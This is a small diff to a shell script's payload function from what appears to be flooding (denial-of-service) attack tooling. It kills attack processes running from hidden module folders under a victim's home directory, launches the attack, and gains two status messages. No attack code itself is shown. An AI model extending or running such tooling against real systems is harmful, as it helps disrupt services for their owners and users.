@@ -40,7 +40,9 @@ payload() {
     pkill -f /home/victim/.etc/.module/flooding_attack
     pkill -f /home/victim/.var/.module/flooding_attack
   fi
+  echo "Launching Flooding Attack..."
   check_file_and_launch_attack
+  echo "Flooding Attack running Background!"
 }
 
 main() {
